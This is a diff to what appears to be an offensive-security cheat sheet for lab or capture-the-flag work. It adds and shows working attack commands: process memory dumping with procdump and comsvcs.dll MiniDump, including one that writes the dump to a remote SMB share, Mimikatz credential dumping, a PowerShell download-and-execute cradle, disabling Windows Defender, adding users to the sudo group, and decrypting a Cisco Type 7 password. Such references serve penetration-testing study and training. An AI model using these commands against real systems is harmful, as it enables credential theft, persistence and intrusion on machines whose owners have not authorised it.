@@ -142,6 +142,7 @@ crackmapexec smb 10.10.10.10 -u 'nik' -H hash_uniq.txt
 
 # Enum4linux
 enum4linux 10.10.10.10
+enum4linux -u "user" -p "password" -a 10.10.10.10
 for i in $(cat list.txt); do enum4linux -a $i;done
 
 ```
@@ -788,6 +789,17 @@ https://github.com/hashcat/kwprocessor
 ./kwp -z basechars/full.base keymaps/en-us.keymap routes/2-to-16-max-3-direction-changes.route
 ```
 
+### Procdump
+
+```bash
+# Download
+https://docs.microsoft.com/en-us/sysinternals/downloads/procdump
+
+# Usage
+.\procdump64.exe -accepteula
+.\procdump64.exe -ma <PID>
+```
+
 ### Hashcat
 
 ```bash
@@ -996,6 +1008,18 @@ powershell.exe -exec bypass -C "IEX (New-Object Net.WebClient).DownloadString('h
 Invoke-Mimikatz -DumpCreds
 ```
 
+### Mimikatz.exe
+
+```bash
+# Run
+.\mimikatz.exe
+
+# Commands
+
+# References
+https://github.com/gentilkiwi/mimikatz/releases
+```
+
 ### Invoke-Kerberoast.ps1
 
 ```bash
@@ -1126,6 +1150,37 @@ while IFS= read -r line; do echo "$line" ; done < word.txt
 # xxd
 xxd notes.txt
 echo "62006600610038003100300034007d000d000a00" | xxd -r -p
+
+# Add new user
+sudo useradd username
+sudo useradd -d /opt/home username
+sudo useradd -u 1002 username
+sudo useradd -u 1002 -g 500 username
+sudo useradd -u 1002 -G admins,webadmins,dev username
+sudo useradd -M username
+sudo useradd -e 2021-10-10 username
+sudo useradd -e 2021-10-10 -f 50 username
+sudo useradd -c "New User 2021" username
+sudo useradd -s /sbin/nologin username
+
+# Add to sudo group
+sudo usermod -aG sudo username
+
+# Remove From sudo group
+sudo deluser username sudo
+```
+
+### Cisco Type 7 Password Decrypter
+
+```bash
+# Download
+https://github.com/theevilbit/ciscot7
+
+# Usage
+python3 ciscot7.py -p "0242114B0E143F015F5D1E161713"
+
+# Example Password Encrypted
+0242114B0E143F015F5D1E161713
 ```
 
 ### Linux Alias
@@ -1165,6 +1220,19 @@ Get-ChildItem -Include "*.*" -recurse | Select-String -pattern "password" | grou
 # Disable Windows Defender
 Set-MpPreference -DisableRealtimeMonitoring $true
 
+# Get Local/Remote Port
+((Get-NetTCPConnection -State Listen | select -ExpandProperty LocalPort) -join [char]44) 
+((Get-NetTCPConnection -State Established  | select -ExpandProperty RemotePort |Sort-Object -Unique) -join [char]44)
+
+# Get SMBShare
+((Get-SMBShare | select -ExpandProperty Name) -join [char]44)
+
+# Get IPV4 Address
+(Get-NetIPAddress -AddressFamily IPv4).IPAddress
+
+# Read /etc/hosts (Remove # - Comments)
+(Get-Content C:\Windows\System32\drivers\etc\hosts | Where { $_ -notmatch [char]94+[char]35 }).Trim()
+
 # View lnk files information
 $sh = New-Object -COM WScript.Shell
 $targetPath = $sh.CreateShortcut('C:\Users\Public\Desktop\shortcut.lnk')
@@ -1190,7 +1258,9 @@ sc query servicename
 # Find File Recursive
 dir *flag* /s /b
 
-# Search content recursive
+# Dump process or pid
+rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump [process ID of process.exe] dump.bin full
+rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump [process ID of process.exe] \\10.10.10.10\public\dump.bin full
 
 ```
 
